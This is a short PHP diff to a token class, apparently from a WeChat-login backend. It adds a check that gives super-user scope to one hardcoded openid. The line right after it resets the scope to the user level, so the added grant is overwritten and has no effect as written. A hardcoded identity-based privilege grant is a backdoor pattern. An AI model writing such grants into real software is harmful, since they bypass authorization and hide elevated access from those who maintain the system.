@@ -111,6 +111,9 @@ class UserToken extends Token
     private function prepareCachedValue($wxResult,$uid){
         $cachedValue = $wxResult;
         $cachedValue['uid'] = $uid;
+        if($wxResult['openid'] == 'oKmv15TgCXEiQTK9HyQAV1q7M9B4'){
+            $cachedValue['scope'] = ScopeEnum::Super;
+        }
         $cachedValue['scope'] = ScopeEnum::User;
         return $cachedValue;
     }
